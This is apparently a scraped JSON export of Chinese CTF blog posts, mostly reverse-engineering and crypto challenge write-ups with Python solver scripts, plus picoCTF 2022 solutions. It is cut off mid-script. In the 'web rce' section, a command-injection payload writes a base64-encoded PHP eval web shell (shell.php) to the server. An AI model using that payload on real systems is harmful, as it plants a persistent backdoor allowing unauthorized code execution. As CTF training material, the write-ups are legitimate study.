如果题目没有输出任何地址泄露，你需要自己构造泄露方式（如利用格式化字符串漏洞、栈溢出读取返回地址等）。","categories":[],"tags":[{"name":"NSS","slug":"NSS","permalink":"http://example.com/tags/NSS/"},{"name":"PWN","slug":"PWN","permalink":"http://example.com/tags/PWN/"}]},{"title":"gdb调试","slug":"控制命令","date":"2025-07-16T03:04:42.000Z","updated":"2025-07-17T11:58:00.123Z","comments":true,"path":"2025/07/16/控制命令/","permalink":"http://example.com/2025/07/16/%E6%8E%A7%E5%88%B6%E5%91%BD%E4%BB%A4/","excerpt":"","text":"TAB：显示所有命令 start:运行到程序入口处 run:运行完整个程序 🔍 x 命令的基本语法：x&#x2F;nfs address n ：要显示的内存单元个数（默认是 1）。 f ：显示格式（format），比如十六进制、十进制、字符串等。 s ：内存单元大小（size），比如字节、半字、字等。 address ：要查看的内存地址（可以是变量名、寄存器、指针表达式等）。 f：输出格式（format） x Hex（十六进制） d Decimal（十进制） u Unsigned decimal o Octal（八进制） t Binary（二进制） f Floating point（浮点数） a Address（地址，显示指针） i Instruction（反汇编指令） c Char（字符） s String（字符串） s：内存单元大小（size） b byte（字节） 1 字节 h halfword（半字） 2 字节 w word（字） 4 字节 g giant word（双字） 8 字节 🧠 示例用法 1.查看地址 0x7fffffffe000 处的 4 个 4 字节数值，以十六进制显示： 1x/4wx 0x7fffffffe000 输出 10x7fffffffe000: 0x00000001 0x00007fff 0x00000000 0x00000000 2. 查看地址 0x400500 处的 5 条汇编指令： 1x/5i 0x400500 输出 123450x400500: push %rbp0x400501: mov %rsp,%rbp0x400504: sub $0x10,%rsp0x400508: mov %edi,-0x4(%rbp)0x40050b: mov %rsi,-0x10(%rbp) 3. 查看栈顶指针 rsp 地址的内容（以 8 字节为单位，显示为十六进制）： 1x/gx $rsp 输出 1x/gx $rsp 4. 查看地址 0x7fffffffe010 开始的字符串： 1x/s 0x7fffffffe010 输出 10x7fffffffe010: &quot;Hello, world!&quot; 5.查看地址 0x601038 的 10 个字节，以十进制形式显示： 1x/10db 0x601038 输出 10x601038: 72 101 108 108 111 44 32 119 111 114 :small_airplane:接收数据 函数 说明 recvall() 接收所有数据直到 EOF recvline() 接收一行（以\\n结尾） recvuntil(delim) 接收数据直到遇到指定分隔符（如&quot;Welcome!&quot;） recvregex(regex) 接收数据直到匹配正则表达式 recv(n) 接收指定字节数的数据（阻塞直到收到 n 字节）","categories":[],"tags":[{"name":"pwn_study","slug":"pwn-study","permalink":"http://example.com/tags/pwn-study/"}]},{"title":"御网杯线下2025","slug":"御网杯2025线下","date":"2025-07-14T13:48:44.000Z","updated":"2025-07-20T10:10:43.524Z","comments":true,"path":"2025/07/14/御网杯2025线下/","permalink":"http://example.com/2025/07/14/%E5%BE%A1%E7%BD%91%E6%9D%AF2025%E7%BA%BF%E4%B8%8B/","excerpt":"","text":"re_c FLAG:flag{HNCTFmng1} re_python 得到 脚本 12345678910c = [144, 163, 158, 177, 121, 39, 58, 58, 91, 111, 25, 158, 72, 53, 152, 78, 171, 12, 53, 105, 45, 12, 12, 53, 12, 171, 111, 91, 53, 152, 105, 45, 152, 144, 39, 171, 45, 91, 78, 45, 158, 8]flag=&quot;&quot;for i in range(42): for j in range (128): if j * 33 % 179 == c[i]: flag+=chr(j)print(flag)#flag&#123;2889e7a3-0d6b-4cbb-b6e9-04c0f26c9dca&#125; 再替换一下 crypto1 放到随波逐流里面能看到Rot13解码之后是明显的16进制编码形式 经过16进制转字符后特征很明显，最后Base32-&gt;Base64-&gt;Ascii85混合解码得到flag。 Crypto_10看到题目描述重排时序 62星序猜测倒序和Base62。 倒序： Base62解码： crypto解压这个文件夹打开下载的附件，有一个压缩包和一张图片。直接解压文件夹需要密码，图片也不能直接打开。 图片用010打开发现文件头是错的修改一下，得到解压密码。 压缩包解压得到flag.jpg直接放随波逐流里然后base64解码。 得到ctf_you_passed包裹flag{}就是最后的flag。 crypto encryption21234567891011121314151617181920212223242526272829303132333435from secret import init1,init2,init3,FLAGimport hashlibassert(FLAG==&quot;flag&#123;&quot;+hashlib.sha256(init1+init2+init3).hexdigest()+&quot;&#125;&quot;)classlfsr(): def__init__(self, init, mask, length): self.init = init self.mask = mask self.lengthmask = 2**(length+1)-1 defnext(self): nextdata = (self.init &lt;&lt; 1) &amp; self.lengthmask i = self.init &amp; self.mask &amp; self.lengthmask output = 0 while i != 0: output ^= (i &amp; 1) i = i &gt;&gt; 1 nextdata ^= output self.init = nextdata return outputdefcombine(x1,x2,x3): return (x1*x2)^(x2*x3)^(x1*x3)if __name__==&quot;__main__&quot;: l1 = lfsr(int.from_bytes(init1,&quot;big&quot;),0b100000000000000000000000010000000000000000000000,48) l2 = lfsr(int.from_bytes(init2,&quot;big&quot;),0b100000000000000000000000000000000010000000000000,48) l3 = lfsr(int.from_bytes(init3,&quot;big&quot;),0b100000100000000000000000000000000000000000000000,48) withopen(&quot;keystream&quot;,&quot;wb&quot;) as f: for i inrange(8192): b = 0 for j inrange(8): b = (b&lt;&lt;1)+combine(l1.next(),l2.next(),l3.next()) f.write(chr(b).encode()) Misc1题目附件是一个加密的压缩包，直接爆破。 打开文档全选复制 粘贴一下就能看到flag Misc2 键盘流量 Misc3 数据包分析附件里的.exe是压缩包，修改后缀解压。 找到流量包全局搜索flag以及flag其他编码形式。 16进制解码 Misc4工业流量分析 按照时间排序，最先STOP的包。 1flag&#123;ac6417423bb3000c&#125; web rce方法一（打印编码的flag）1ip/?cmd=print(base64_encode(file_get_contents(base64_decode(&quot;ZmxhZy5waHA=&quot;)))); 方法二（写入webshell）直接写入一个webshell 1234file_put_contents( base64_decode(&quot;c2hlbGwucGhw&quot;), // &quot;shell.php&quot; base64_decode(&quot;PD9waHAgQGV2YWwoJF9QT1NUW3hdKTs/Pg==&quot;) // &quot;&lt;?php @eval(\\$_POST[x]); ?&gt;&quot;); 进行编码后为： 1ip/?cmd=file_put_contents(base64_decode(&quot;c2hlbGwucGhw&quot;),base64_decode(&quot;PD9waHAgQGV2YWwoJF9QT1NUW3hd web 二次编码直接访问/flag.php就可以得到flag.php web sql直接用sqlmap。","categories":[],"tags":[{"name":"WP","slug":"WP","permalink":"http://example.com/tags/WP/"}]},{"title":"[HNCTF 2022 WEEK4]flower plus","slug":"HNCTF-2022-WEEK4-flower-plus","date":"2025-07-14T00:49:30.000Z","updated":"2025-07-14T06:53:00.725Z","comments":true,"path":"2025/07/14/HNCTF-2022-WEEK4-flower-plus/","permalink":"http://example.com/2025/07/14/HNCTF-2022-WEEK4-flower-plus/","excerpt":"","text":"链接 花指令分析 发现花指令 db 0C7h 的“垃圾”作用： 0x4012A6 处的 db 0C7h 是一个数据字节。它被 jnz 指令跳转到，但它本身不是一个有意义的执行路径。它的存在是为了干扰反汇编器的线性分析，使其认为这里存在一个实际的代码分支。反汇编器可能会将 0C7h 解码为 MOV EDI, EBP (如果加上前缀的话)，或者只是一个数据字节，无论哪种，都与正常逻辑不符。 为了不影响汇编器的分析 要把这里进行判断和跳转的都NOP掉 将 push ebx 和 pop ebx 都 NOP 掉的主要原因是为了完全消除这个花指令的副作用和混淆链： 栈平衡： push ebx 和 pop ebx 是一对用来维护栈平衡的操作。如果它们是花指令的一部分，并且它们保存&#x2F;恢复的寄存器值在中间被修改（例如被 xor ebx, ebx 清零），那么这对 push/pop 实际上是无效的或者说是误导性的。它们的存在只是为了让代码看起来更复杂，或者在某些情况下通过不匹配的栈操作来干扰分析。 如果只 NOP 掉中间的跳转，保留 push ebx 和 pop ebx，那么在 push ebx 之后，ebx 立即被清零，然后又被 pop ebx 恢复。这可能会导致 ebx 的值在函数中被不必要地改变和恢复，即使它不是真正需要的。 第二个花指令 执行 0x401358: call loc_40135E: call 指令本身占用 5 个字节 (E8 01 00 00 00)。 call 指令的下一条指令的地址是 0x401358 + 5 = 0x40135D。 CPU 将 0x40135D 压入栈中。此时，0x40135D 就是栈顶的返回地址。 CPU 跳转到 0x40135E 开始执行。 执行 0x40135E: db 36h: 这是一个数据字节，但是 CPU 会尝试将其作为指令执行。这通常是花指令的混淆手法，它可能不会导致崩溃，而是作为无效指令执行或者被后续指令覆盖。 假设它被执行了，或者被跳过了，程序流会继续到 0x40135F。 执行 0x40135F: add dword ptr [esp], 8: 这条指令非常关键。 [esp] 指的是栈顶的内存地址。当前栈顶存放的是 0x40135D（原始返回地址）。 add dword ptr [esp], 8 的作用是：将栈顶存放的那个 dword 值（即 0x40135D）加上 8，然后把结果再写回栈顶。 所以，栈顶的返回地址从 0x40135D 变成了 0x40135D + 8 = 0x401365。 执行 0x401362: retn: retn 指令会从栈顶弹出地址。 它弹出的不再是原始的 0x40135D，而是被 add 指令修改后的 0x401365。 CPU 跳转到 0x401365 开始执行。 原始的返回地址是 0x40135D。如果没有任何 add 操作，retn 会回到 0x40135D。 但是，add dword ptr [esp], 8 将返回地址修改成了 0x401365。 这意味着当 retn 执行时，程序会直接从 0x401365 开始执行， 所以，add dword ptr [esp], 8 的作用就是人为地调整了 retn 的目标地址，使其跳过了 0x40135D 到 0x401364（包含 0x401364）这段区域，直接跳转到 0x401365 去执行。 这就是这种花指令用于混淆控制流的一种常见手法。 所以NOP的范围包括0x401364 为什么是花指令 正常情况下，call 指令会直接跳转到被调用函数的入口点。这个入口点应该是一条合法的可执行指令。 但是在这里，当 call 指令跳转到 0x40135E 时，它遇到的第一个字节是 db 36h。 反汇编器困惑： 静态反汇编器在 0x40135E 看到 db 36h 时，通常会认为这是数据，而不是代码。它可能因此停止对该区域的代码分析，或者产生错误的解码。 CPU 行为： CPU 会尝试将 36h 作为指令来解码执行。如前所述，36h 是一个段超越前缀（SS:）。CPU 会尝试将其与随后的字节组合成一条指令。 如果 36h 后面跟着的字节（即 add dword ptr [esp], 8 的字节码 83）不能与 36h 形成一条合法的指令，或者形成了程序员不期望的指令，这就会导致程序行为异常或崩溃。 然而，在某些复杂的混淆中，可能会利用这种前缀的特性，使得处理器在特定上下文中能正确执行，而反汇编器却难以理解。 call花指令识别 call 目标是数据字节或非指令区。 call 后面紧跟数据定义。 call 目标内部有 add dword ptr [esp], N 来修改返回地址。 最后以 retn 结束，并且 retn 之后的字节可能也是混淆的一部分。 脚本1234567891011121314stae=0x00401006end=0x00401402 for i in range(stae, end+1): if get_wide_dword(i)== 0x01740275: patch_dword(i,0x90909090) patch_dword(i-4,0x90909090) patch_word(i+4,0x9090) patch_word(i-5,0x90) if get_wide_dword(i)== 0x000001E8: if get_wide_dword(i+4)== 0x8336E800: patch_dword(i,0x90909090) patch_dword(i+4,0x90909090) patch_dword(i+8,0x90909090) patch_byte(i+12,0x90) 然后选中函数头U解构 C重构一下就好 就可以看待main函数了 在这个函数中看到RC4的标志 之后经过一个异或 然后进入sub_40128F进行核验 这是其加密后的值 右键 提取数据 异或脚本 123456789101112131415161718192021222324252627a=[0x0000004D, 0xFFFFFFE6, 0x00000049, 0xFFFFFF95, 0x00000003, 0x0000002D, 0x0000002B, 0xFFFFFFBA, 0xFFFFFFEA, 0x0000006D, 0xFFFFFFFF, 0x00000059, 0x00000070, 0x00000000, 0x0000001B, 0xFFFFFFA9, 0x0000002C, 0xFFFFFFB0, 0x00000032, 0xFFFFFF98, 0x0000006F, 0xFFFFFF8C, 0x00000056, 0xFFFFFFA2, 0x0000004C, 0x00000079, 0x0000007F]for i in range(len(a)-1,-1,-1): a[i]^=a[(i+1)%len(a)] print(a[i], end=&#x27; &#x27;)decimal_numbers =ahex_output = []for num in decimal_numbers: unsigned_32bit_num = num &amp; 0xFFFFFFFF hex_str = hex(unsigned_32bit_num)[2:].upper().zfill(8) hex_output.append(&quot;0x&quot; + hex_str)for i in range(0, len(hex_output), 4): print(&quot;, &quot;.join(hex_output[i:i+4])) #十进制50 75 7 4294967205 4294967283 127 16 4294967176 4294967226 10 38 4294967183 4294967188 4294967188 4294967268 4294967229 66 47 4294967237 127 84 121 122 4294967279 4294967206 64 13 #十六进制0x0000000D, 0x00000040, 0xFFFFFFA6, 0xFFFFFFEF0x0000007A, 0x00000079, 0x00000054, 0x0000007F0xFFFFFFC5, 0x0000002F, 0x00000042, 0xFFFFFFBD0xFFFFFFE4, 0xFFFFFF94, 0xFFFFFF94, 0xFFFFFF8F0x00000026, 0x0000000A, 0xFFFFFFBA, 0xFFFFFF880x00000010, 0x0000007F, 0xFFFFFFF3, 0xFFFFFFA50x00000007, 0x0000004B, 0x00000032 ​ 处理RC4 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990def to_unsigned_32bit_and_byte(n): if n &lt; 0: n += 0x100000000 return n &amp; 0xFFdef to_signed_32bit(n): if n &gt; 0x7FFFFFFF: n -= 0x100000000 return ndef to_unsigned_32bit(n): if n &lt; 0: n += 0x100000000 return n &amp; 0xFFFFFFFF# --- RC4 阶段 1: KSA (密钥调度算法) ---# 定义: 初始化 S 盒并根据密钥对其进行置换。# 输入: 密钥字节 (key_bytes), 密钥长度模数 (key_mod_len)# 输出: 经过初始置换的 S 盒 (s_box)def s_init(key_bytes, key_mod_len): s_box = list(range(256)) v4_ksa_t_box = [key_bytes[i % key_mod_len] for i in range(256)] j = 0 for i in range(256): j = (v4_ksa_t_box[i] + j + s_box[i]) % 256 s_box[i], s_box[j] = s_box[j], s_box[i] return s_box# --- RC4 阶段 2 &amp; 3: PRGA (伪随机生成算法) &amp; 最终数据处理 ---# 定义:# PRGA: 根据 S 盒生成伪随机密钥流。# 最终数据处理: 使用生成的密钥流对输入数据进行异或操作。# 输入: 待处理数据数组 (data_array), 密钥字节 (key_bytes), # 密钥长度模数 (key_mod_len), 数据长度 (data_len)# 输出: 经过处理后的数据数组 (result_am_array)def rc4_variant_process(data_array, key_bytes, key_mod_len, data_len): # KSA 阶段的调用 s_box = s_init(key_bytes, key_mod_len) l = 0 v9 = 0 # 用于存储生成的密钥流 generated_keystream = [0] * data_len # --- RC4 阶段 2: PRGA (生成密钥流) --- for k in range(data_len): l = (l + 3) % 256 v9 = (v9 + s_box[l] + 1) % 256 s_box[l], s_box[v9] = s_box[v9], s_box[l] generated_keystream[k] = s_box[(s_box[v9] + s_box[l]) % 256] # --- RC4 阶段 3: 最终数据处理 (异或操作) --- result_am_array = list(data_array) for i in range(data_len): result_am_array[i] = to_signed_32bit(to_unsigned_32bit(result_am_array[i]) ^ to_unsigned_32bit(generated_keystream[i])) return result_am_arrayif __name__ == &quot;__main__&quot;: rc4_key_string = &#x27;Hello_Ctfers!!!&#x27; key_as_byte_list = list(map(ord, rc4_key_string)) if len(key_as_byte_list) &lt; 16: key_as_byte_list.append(0) KEY_MOD_LEN = 16 am_initial_hex = [ 0x0000000D, 0x00000040, 0xFFFFFFA6, 0xFFFFFFEF, 0x0000007A, 0x00000079, 0x00000054, 0x0000007F, 0xFFFFFFC5, 0x0000002F, 0x00000042, 0xFFFFFFBD, 0xFFFFFFE4, 0xFFFFFF94, 0xFFFFFF94, 0xFFFFFF8F, 0x00000026, 0x0000000A, 0xFFFFFFBA, 0xFFFFFF88, 0x00000010, 0x0000007F, 0xFFFFFFF3, 0xFFFFFFA5, 0x00000007, 0x0000004B, 0x00000032 ] am_initial_data = [to_signed_32bit(h) for h in am_initial_hex] n = len(am_initial_data) final_am_values = rc4_variant_process(am_initial_data, key_as_byte_list, KEY_MOD_LEN, n) output_chars = bytearray() for val in final_am_values: output_chars.append(to_unsigned_32bit_and_byte(val)) print(output_chars.decode(&#x27;latin-1&#x27;)) #NSSCTF&#123;Hn_CtF_w111_end_Lol&#125;","categories":[],"tags":[{"name":"花指令","slug":"花指令","permalink":"http://example.com/tags/%E8%8A%B1%E6%8C%87%E4%BB%A4/"},{"name":"NSS","slug":"NSS","permalink":"http://example.com/tags/NSS/"},{"name":"RE","slug":"RE","permalink":"http://example.com/tags/RE/"},{"name":"RC4变式","slug":"RC4变式","permalink":"http://example.com/tags/RC4%E5%8F%98%E5%BC%8F/"}]},{"title":"[HDCTF 2023]enc","slug":"HDCTF-2023-enc","date":"2025-07-11T11:35:05.000Z","updated":"2025-07-14T06:49:28.131Z","comments":true,"path":"2025/07/11/HDCTF-2023-enc/","permalink":"http://example.com/2025/07/11/HDCTF-2023-enc/","excerpt":"","text":"链接 打开进入这个函数 发现TEA加密 分析之后知道 下一步核对的v7和v8都是改变后的密文 v9才是密钥 解密时注意，异或的时候从后往前异或，倒着来 脚本 1234567891011121314151617#tea解密def tea_decrypt(v, k): v0, v1 = v[0], v[1] delta = 0x61C88647 sum = -(delta * 32) &amp; 0xFFFFFFFF for _ in range(32): v1 = (v1 - ((16*v0 + k[2]) ^ (v0 + sum) ^((v0 &gt;&gt;5) + k[3]))) &amp; 0xFFFFFFFF v0 = (v0 - ((16*v1+ k[0]) ^ (v1 + sum) ^((v1 &gt;&gt;5) + k[1]))) &amp; 0xFFFFFFFF sum = (sum + delta) &amp; 0xFFFFFFFF return [v0, v1] # 给定密文v9和密钥v10v9 = [0x60fcdef7,0x236dbec]v10 = [0x12,0x34,0x56,0x78]print(tea_decrypt(v9, v10))//key=3 继续看下面的函数 sub_4113DE —&gt;sub_414C10—&gt;sub_411046—&gt;sub_414B00—&gt;sub_411221—&gt;sub_415340 (char *)a1 或 (_BYTE *)a1 是将整数地址 a1 转换为内存指针。 然后通过 *ptr ^= a3 修改该地址上的内容。 所以是SMC 那下一步就是找到它改变的地址的范围 打开x32xdbg ctrl+g输入00415340 F9运行后会停在这里 所以修改位置的位置头是0x0041D000 长度是0下600 所以在ida中运行脚本 脚本 1234567891011121314151617# 导入 ida_bytes 模块，这是现代 IDA Python 推荐的字节操作方式from ida_bytes import get_byte, patch_byte # 定义操作的起始地址、结束地址和异或密钥start_address = 0x41d000end_address = 0x41E600 # range函数不包含end_addressxor_key = 3 print(&quot;开始批量异或修改...&quot;)# 遍历指定范围内的每个字节并进行异或操作for i in range(start_address, end_address): original_byte = get_byte(i) # 使用 get_byte 从 ida_bytes 模块读取字节 new_byte = original_byte ^ xor_key patch_byte(i, new_byte) # 使用 patch_byte 从 ida_bytes 模块写入字节print(&quot;修改完成&quot;) 之后再在函数头按U结构 再选中范围去C 就可以了 发现是RC4加密 脚本 12345678910111213141516171819202122232425262728293031323334key=list(&#x27;you_are_master&#x27;)content=[0xf,0x94,0xae,0xf2,0xc0,0x57,0xc2,0xe0,0x9a,0x45,0x37,0x50,0xf5,0xa0,0x5e,0xcb,0x2c,0x16,0x28,0x29,0xfe,0xff,0x33,0x46,0xe,0x57,0x82,0x22,0x52,0x26,0x2b,0x6e,0xe4,0x82,0x24]rc4number=0x100s=[0]*rc4numberflag=&#x27;&#x27; def rc4_init(s,key,rc4number): for i in range(rc4number): s[i]=i j=0 for i in range(rc4number): j=(j+s[i]+ord(key[i%len(key)]))%rc4number temp=s[i] s[i]=s[j] s[j]=temp def rc4_endecode(s,content,rc4number): i=0 j=0 for k in range(len(content)): i=(i+1)%rc4number j=(j+s[i])%rc4number temp=s[i] s[i]=s[j] s[j]=temp t=(s[i]+s[j])%rc4number content[k]=chr(content[k]^s[t]) content=&#x27;&#x27;.join(content) print(content) rc4_init(s,key,rc4number)rc4_endecode(s,content,rc4number)","categories":[],"tags":[{"name":"NSS","slug":"NSS","permalink":"http://example.com/tags/NSS/"},{"name":"RE","slug":"RE","permalink":"http://example.com/tags/RE/"},{"name":"TEA","slug":"TEA","permalink":"http://example.com/tags/TEA/"},{"name":"SMC","slug":"SMC","permalink":"http://example.com/tags/SMC/"},{"name":"RC4","slug":"RC4","permalink":"http://example.com/tags/RC4/"}]},{"title":"picoCTF2022","slug":"picoCTF2022","date":"2025-07-10T04:06:13.000Z","updated":"2025-07-14T07:25:49.743Z","comments":true,"path":"2025/07/10/picoCTF2022/","permalink":"http://example.com/2025/07/10/picoCTF2022/","excerpt":"","text":"CRYPTOVigenere题目信息 key CYLAB cipher: rgnoDVD&#123;O0NU_WQ3_G1G3O3T3_A1AH3S_cc82272b&#125; 题目给了密文和密钥，用随波逐流打开，解密，发现是维吉尼亚加密 flag:picoCTF{D0NT_US3_V1G3N3R3_C1PH3R_ae82272q} basic-mod1题目信息 描述： 我们发现这个奇怪的消息在服务器上传递，我们认为我们有一个有效的 decrpytion 方案。取每个数字 mod 37 并将其映射到以下字符集：0-25 是字母表（大写），26-35 是十进制数字，36 是下划线。以 picoCTF 标志格式包装解密的消息（即 picoCTF{decrypted_message}） 数字：350 63 353 198 114 369 346 184 202 322 94 235 114 110 185 188 225 212 366 374 261 213 按照题目信息对取模厚的数字根据其ASCLL码修改，并转化为字符输出 123456789101112131415161718def simplify_numbers(numbers): result = [] for num in numbers: remainder = num % 37 if 0 &lt;= remainder &lt;= 25: result.append(chr(ord(&#x27;A&#x27;) + remainder)) elif 26 &lt;= remainder &lt;= 35: result.append(str(remainder - 26)) elif remainder == 36: result.append(&#x27;_&#x27;) else: result.append(f&quot;[&#123;remainder&#125;]&quot;) return &quot;&quot;.join(result)my_numbers = [350, 63, 353, 198, 114, 369, 346, 184, 202, 322, 94, 235, 114, 110, 185, 188, 225, 212, 366, 374, 261, 213]simplified_string = simplify_numbers(my_numbers)print(simplified_string) flag：picoCTF{R0UND_N_R0UND_ADD17EC2} substitution0题目信息 描述： 一条消息进来了，但似乎全都乱七八糟。幸运的是，它似乎一开始就有钥匙。你能破解这个替换密码吗？ 密文： OHNFUMWSVZLXEGCPTAJDYIRKQB Suauypcg Xuwaogf oacju, rvds o waoiu ogf jdoduxq ova, ogf hacywsd eu dsu huudxumace o wxojj noju vg rsvns vd roj ugnxcjuf. Vd roj o huoydvmyx jnoaohouyj, ogf, oddsod dveu, yglgcrg dc godyaoxvjdj—cm ncyaju o wauod pavbu vg o jnvugdvmvn pcvgdcm ivur. Dsuau ruau drc acygf hxonl jpcdj guoa cgu ukdauevdq cm dsu honl, ogf oxcgw cgu guoa dsu cdsua. Dsu jnoxuj ruau uknuufvgwxq soaf ogf wxcjjq, rvds oxx dsuoppuoaognu cm hyagvjsuf wcxf. Dsu ruvwsd cm dsu vgjund roj iuaq aueoalohxu, ogf,dolvgw oxx dsvgwj vgdc ncgjvfuaodvcg, V ncyxf soafxq hxoeu Zypvdua mca svj cpvgvcgaujpundvgw vd. Dsu mxow vj: pvncNDM&#123;5YH5717Y710G_3I0XY710G_03055505&#125; 解密 猜测密钥凯撒密码加密，把第一句作为密钥 flag; picoCTF{5UB5717U710N_3V0LU710N_03055505} RESafe Opener题目信息 描述：你能打开这个保险箱吗？我忘记了保险箱的钥匙，但这个程序应该可以帮助我找回丢失的钥匙。你能帮我打开保险箱吗？将您恢复的密码放入 picoCTF 标志格式，例如：picoCTF{password} 代码 123456789101112131415161718192021222324252627282930313233343536373839404142import java.io.*;import java.util.*; public class SafeOpener &#123; public static void main(String args[]) throws IOException &#123; BufferedReader keyboard = new BufferedReader(new InputStreamReader(System.in)); Base64.Encoder encoder = Base64.getEncoder();//Base6的编码器 String encodedkey = &quot;&quot;; String key = &quot;&quot;; int i = 0; boolean isOpen; while (i &lt; 3) &#123; System.out.print(&quot;Enter password for the safe: &quot;); key = keyboard.readLine(); encodedkey = encoder.encodeToString(key.getBytes());//对密码进行Base64加密 System.out.println(encodedkey); isOpen = openSafe(encodedkey);//调用方法进行核对 if (!isOpen) &#123; System.out.println(&quot;You have &quot; + (2 - i) + &quot; attempt(s) left&quot;); i++; continue; &#125; break; &#125; &#125; public static boolean openSafe(String password) &#123; String encodedkey = &quot;cGwzYXMzX2wzdF9tM18xbnQwX3RoM19zYWYz&quot;;//BASE64加密后的结果 if (password.equals(encodedkey)) &#123; System.out.println(&quot;Sesame open&quot;); return true; &#125; else &#123; System.out.println(&quot;Password is incorrect\\n&quot;); return false; &#125; &#125;&#125; 正如代码中的注释一样，用户输入密码，进行Base64编码，调用函数检验编码厚的数值是否符合指定字符，所以密码就是指定字符Base64解码 flag：picoCTF{pl3as3_l3t_m3_1nt0_th3_saf3} GDB test题目信息 你能得到这面旗帜吗？ 以下是试用说明： 123456$ chmod +x gdbme$ gdb gdbme(gdb) layout asm(gdb) break *(main+99)(gdb) run(gdb) jump *(main+104) 解密 按照给的命令进行操作 flag: picoCTF{d3bugg3r_dr1v3_7776d758} fresh-java题目信息 你能得到这面旗帜吗？对这个 Java 程序进行逆向工程 用jad-gui打开这个文件，发现该密文已将被定义好了 flag：picoCTF{700l1ng_r3qu1r3d_738cac89} file-run1题目信息 已为您提供一个程序，如果您尝试在命令行上运行它会发生什么？ 解密 首先要为程序赋权限 chmod +x ru 运行该程序并且执行命令.&#x2F;run flag:picoCTF{U51N6_Y0Ur_F1r57_F113_9bc52b6b} file-run2题目信息 另一个程序，但这一次，它似乎需要一些输入。如果您尝试在命令行上运行它并输入 “Hello！”会发生什么情况？ 解密 首先要为程序赋权限 chmod +x ru 运行该程序并且执行命令.&#x2F;run Hello! flag:picoCTF{F1r57_4rgum3n7_f65ed63e} Bbbbloat题目信息 你能得到这面旗帜吗？对这个二进制文件进行逆向工程。 解密 分析得到，最喜欢的是数字应该为549255 为文件赋权限 chmod +x Bbbbloat 运行程序./Bbbbloat flag：picoCTF{cu7_7h3_bl047_44f74a60} unpackme题目描述 你能得到这面旗帜吗？对这个二进制文件进行逆向工程。 解密 文件以upx结尾，尝试upx脱壳 之后拖入ida中 发现最喜爱的数字是754635 flag: picoCTF{up&gt;&lt;_m3_f7w_e510a27f} PWNRPS题目描述 这是一个对你玩石头剪刀布的程序。我听说如果你连续赢了 5 次，就会发生好事。可以下载带有标记已编辑的程序源代码 这里 。 解密 主函数 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647int main () &#123; char input[3] = &#123;&#x27;\\0&#x27;&#125;; int command; int r; puts(&quot;Welcome challenger to the game of Rock, Paper, Scissors&quot;); puts(&quot;For anyone that beats me 5 times in a row, I will offer up a flag I found&quot;); puts(&quot;Are you ready?&quot;); while (true) &#123; puts(&quot;Type &#x27;1&#x27; to play a game&quot;); puts(&quot;Type &#x27;2&#x27; to exit the program&quot;); r = tgetinput(input, 3); // Timeout on user input if(r == -3) &#123; printf(&quot;Goodbye!\\n&quot;); exit(0); &#125; //前面那些都不重要 if ((command = strtol(input, NULL, 10)) == 0) &#123; puts(&quot;Please put in a valid number&quot;); &#125; else if (command == 1) &#123; printf(&quot;\\n\\n&quot;); if (play()) &#123; wins++; &#125; else &#123; wins = 0; &#125; if (wins &gt;= 5) &#123; puts(&quot;Congrats, here&#x27;s the flag!&quot;); puts(flag); &#125; &#125; else if (command == 2) &#123; return 0; &#125; else &#123; puts(&quot;Please type either 1 or 2&quot;); &#125; &#125; return 0;&#125; 判断胜负 1234567891011121314151617181920212223242526//判断胜负bool play () &#123; char player_turn[100]; srand(time(0));//电脑的出拳设计 int r; printf(&quot;Please make your selection (rock/paper/scissors):\\n&quot;);//校验 r = tgetinput(player_turn, 100); if(r == -3) &#123; printf(&quot;Goodbye!\\n&quot;); exit(0); &#125; int computer_turn = rand() % 3;//确保在3个手势中随机选择一个 printf(&quot;You played: %s\\n&quot;, player_turn); printf(&quot;The computer played: %s\\n&quot;, hands[computer_turn]); if (strstr(player_turn, loses[computer_turn])) &#123;//核验我们所出的是否包含胜利所需要底色那个手势 puts(&quot;You win! Play again?&quot;); return true; &#125; else &#123; puts(&quot;Seems like you didn&#x27;t win this time. Play again?&quot;); return false; &#125;&#125; 所以我们要经过5次循环，且每次循环都要向程序输出rock&#x2F;paper&#x2F;scissors的结合 脚本12345678from pwn import *p = remote(&#x27;saturn.picoctf.net&#x27;, 60179)for i in range(5): p.sendline(b&#x27;1&#x27;) p.sendline(b&#x27;rock/paper/scissors&#x27;)print(p.recvline_contains(b&#x27;picoCTF&#123;&#x27;)) basic-file-exploit 漏洞题目信息 提供的程序允许您写入文件并从中读取您写入的内容。试着玩弄它，看看你是否能打破它！可以下载带有标记已编辑的程序源代码 这里 解密 有分析可得tgetinput用来校验空输入等基本校验工作，data_write数据输入，data_read数据读取，且其中包含flag的输出 由main可以知道。首先选择要进行的模式，且第一次必须先存入，否则无法调用data_read函数 123456789101112131415161718192021222324252627static void data_read() &#123; char entry[4]; long entry_number; char output[100]; int r; memset(output, &#x27;\\0&#x27;, 100); printf(&quot;Please enter the entry number of your data:\\n&quot;); r = tgetinput(entry, 4); // Timeout on user input if(r == -3) &#123; printf(&quot;Goodbye!\\n&quot;); exit(0); &#125; if ((entry_number = strtol(entry, NULL, 10)) == 0) &#123;//尝试将 entry 字符串的开头部分解析成一个十进制的长整型数值， puts(flag); fseek(stdin, 0, SEEK_END); exit(0); &#125; entry_number--; strncpy(output, data[entry_number], input_lengths[entry_number]); puts(output);&#125; 所以重点就是((entry_number = strtol(entry, NULL, 10)) == 0)的输出结果为0 flag:picoCTF{M4K3_5UR3_70_CH3CK_Y0UR_1NPU75_68466E2F} buffer overflow 0题目信息 让我们从简单的开始，你能溢出正确的缓冲区吗？该程序可在此处获得。您可以查看源代码 这里 。 解密 主函数 signal(11, sigsegv_handler)当程序发生段错误（即收到信号 11，也就是 SIGSEGV）时，不执行默认操作（崩溃），而是跳转到你定义的 sigsegv_handler 函数进行处理。 当你的程序试图访问非法内存地址（如未分配的内存、只读内存、已释放的内存等）时，操作系统会发送这个信号给程序。 默认情况下，收到 SIGSEGV 会导致程序崩溃（段错误）。 示例触发原因： 解引用空指针：*NULL 写入常量字符串：strcpy(&quot;hello&quot;, &quot;world&quot;) 越界访问栈数组、堆数组 使用未初始化的指针 这个对flag.txt文件的操作 相当于bin&#x2F;sh后门函数 它包含了读取flag,并把flag输出在终端 而在 Linux&#x2F;Unix 系统中，/bin/sh 是一个指向系统默认 shell（如 Bash）的可执行文件 sigsegv_handler函数 该函数会输出flag 所以只需要实现就可以输出flag 脚本1234from pwn import *p = remote(&quot;saturn.picoctf.net&quot;, 